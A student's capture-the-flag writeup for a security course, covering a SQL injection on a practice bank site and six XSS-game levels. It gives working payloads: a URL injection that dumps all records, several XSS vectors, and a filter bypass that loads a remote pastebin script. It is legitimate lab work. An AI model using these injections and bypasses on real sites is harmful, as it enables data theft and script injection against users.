# Crypto II Writeup

Name: Tuan Le
Section: 0201

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Tuan Le

## Assignment Writeup

### Part 1 (40 Pts)

Since this website does not have any place for user input, I knew the sql injection attack had to be within the url itself. To get all the
records in the database, I knew I could sneak in a true boolean to the query so everything gets dumped. I entered this into the url:
'1337bank.money:5000/item?id=1'||1=1-- -'. At first I tried to use 'or' instead of '||' but the server detected that it was an
sql injection attack, and stopped it. I added the '-- -' at the end to make sure the rest of the query is commented out. Running this url
gave me all the contents of the website along with the flag. The flag is CMSC389R-{y0u_ar3_th3_SQ1_ninj@}

### Part 2 (60 Pts)

Level 1: This level presented a simple search box. I ran '<script>alert(1)</script>' in the search bar to pop up a JavaScript alert. This command injects a simple script to be ran inside the search bar.

Level 2: In the post box, I entered '<img src=i onerror=javascript:alert(1)></img>' which popped the alert. Since the script tags would not work, I had to use the img tags with the onerror attribute.

Level 3: For this level, I knew the injection had to be in the URL. To find where I could do the injection, I looked at the JavaScript and found a vulnerability in window.location. I saw that the num argument is used to generatate the img tags. To insert the JavaScript, I used the onerror attribute again. I modified my injection from level 2 to be 'https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';

Level 4: Immediately I knew that for this level, there was some way to escape the function and append the alert() call. After looking up '%3B' which represents the semi-colon, I was able to use it to terminate the call and then insert the alert(). The final url was 'https://xss-game.appspot.com/level4/fran??timer=4')%3Balert('xss' which popped the alert.

Level 5: This level also presented a search box. While looking at the JavaScript, I noticed that the 'next' parameter was being used for redireciton. It is being used as tag target so I inserted the alert() there. In the search box, I ran 'https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)' which worked.

Level 6: The mission objective for this level was the make the application request an external file which will cause an alert(). So for this level, I created a pastebin that just had alert(1). Looking at the JavaScript, I found out that anything containing 'http' would be rejected. However, I realized that the match for 'http' is not case sensitve. Using this loophole, I used 'hTTPs' instead. The final url I ran was 'https://xss-game.appspot.com/level6/frame#hTTPs://pastebin.com/p47gTvFs
